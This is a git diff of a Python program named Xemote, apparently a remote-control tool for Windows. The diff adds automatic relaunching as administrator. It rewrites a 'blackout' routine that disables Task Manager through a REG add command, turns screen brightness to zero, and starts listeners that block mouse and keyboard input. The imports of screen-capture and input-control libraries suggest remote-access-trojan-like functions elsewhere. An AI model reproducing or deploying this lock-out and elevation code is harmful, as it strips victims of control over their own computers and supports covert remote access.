@@ -3,19 +3,14 @@ import mysql.connector
 import json
 
 # Class: Arsenal
-import subprocess
-import cv2
-import pyautogui
-import pynput
-import ctypes
+import subprocess, cv2, pyautogui, pynput, ctypes
 
 # Class: Xemote
-import time
-import uuid
-import threading
+import time, uuid, threading
 
-'''
-====================================================================================================
+import pyuac
+
+'''====================================================================================================
 # Title: Database (Class)
 # ~ Description: Store Database Operations For Xemote
 @methods:
@@ -158,8 +153,7 @@ class Database:
     def __del__(self):
         self.__disconnect()
 
-'''
-====================================================================================================
+'''====================================================================================================
 # Title: Arsenal (Class)
 # ~ Description: Store Main Functions For Xemote
 @methods:
@@ -245,9 +239,8 @@ class Arsenal(Database):
     '''
     def blackout(self, state):
         if state == "block":
-            # Add a registry key to remove the task manager
-            key = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-            ctypes.windll.advapi32.RegSetValueExW(ctypes.c_wchar_p(key), 0, 0, 1, ctypes.c_wchar_p("DisableTaskMgr"), 1)
+            # Command to disable the Task Manager
+            subprocess.run('REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
 
             # Brightness: 0
             subprocess.run(["powershell", "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,0)"])
@@ -255,10 +248,9 @@ class Arsenal(Database):
             # Start the mouse listener to block mouse input
             self.mouse_listener.start()
             self.keyboard_listener.start()
-        elif state == "unblock":   
-            # Remove the registry key to allow the task manager
-            key = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-            ctypes.windll.advapi32.RegDeleteValueW(ctypes.c_wchar_p(key), ctypes.c_wchar_p("DisableTaskMgr"))
+        elif state == "unblock":
+            # Command to enable the Task Manager
+            subprocess.run('REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f', shell=True)
 
             # Brightness: 100
             subprocess.run(["powershell", "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,100)"])
@@ -300,8 +292,7 @@ class Arsenal(Database):
     def __del__(self):
         super().__del__()  # Call the parent class's __del__ method for cleanup
 
-''' 
-====================================================================================================
+''' ====================================================================================================
 # Title: Xemote (Class)
 # ~ Description: Main Class For Xemote
 @methods: 
@@ -470,12 +461,16 @@ class Xemote(Arsenal):
     def __del__(self):
         super().__del__()  # Call the parent class's __del__ method for cleanup
 
-''' 
-====================================================================================================
+''' ====================================================================================================
 # Main Driver
 # ~ Description: Main Driver For Xemote
 # ====================================================================================================
 '''
-obj = Xemote()
 
-obj.execute()
+if __name__ == "__main__":
+    if not pyuac.isUserAdmin():
+        print("Re-launching as admin!")
+        pyuac.runAsAdmin()
+    else:        
+        obj = Xemote()
+        obj.execute()
